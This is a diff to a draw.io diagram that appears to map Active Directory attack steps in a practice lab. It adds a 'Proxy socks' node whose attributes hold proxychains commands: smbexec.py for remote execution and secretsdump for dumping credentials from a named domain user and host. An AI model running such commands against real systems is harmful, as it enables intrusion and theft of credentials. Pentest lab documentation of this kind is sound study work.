@@ -563,6 +563,16 @@
             <mxGeometry height="140" width="340" x="670" y="480" as="geometry" />
           </mxCell>
         </object>
+        <object label="Web access" id="T8m0tFcZdCzzQ6wYk1kz-2">
+          <mxCell parent="1" style="whiteSpace=wrap;html=1;fontSize=14;rounded=1;strokeColor=default;" vertex="1">
+            <mxGeometry height="57" width="156" x="1740" y="730" as="geometry" />
+          </mxCell>
+        </object>
+        <object label="&lt;div&gt;Proxy socks&lt;/div&gt;" exec_cmd="proxychains smbexec.py -no-pass &#39;NORTH&#39;/&#39;EDDARD.STARK&#39;@&#39;192.168.56.22&#39; -debug" dump_creds="proxychains secretsdump -no-pass &#39;NORTH&#39;/&#39;EDDARD.STARK&#39;@&#39;192.168.56.22&#39;" id="T8m0tFcZdCzzQ6wYk1kz-3">
+          <mxCell parent="1" style="whiteSpace=wrap;html=1;fontSize=14;rounded=1;strokeColor=#e5a50a;" vertex="1">
+            <mxGeometry height="57" width="156" x="1740" y="790" as="geometry" />
+          </mxCell>
+        </object>
       </root>
     </mxGraphModel>
   </diagram>
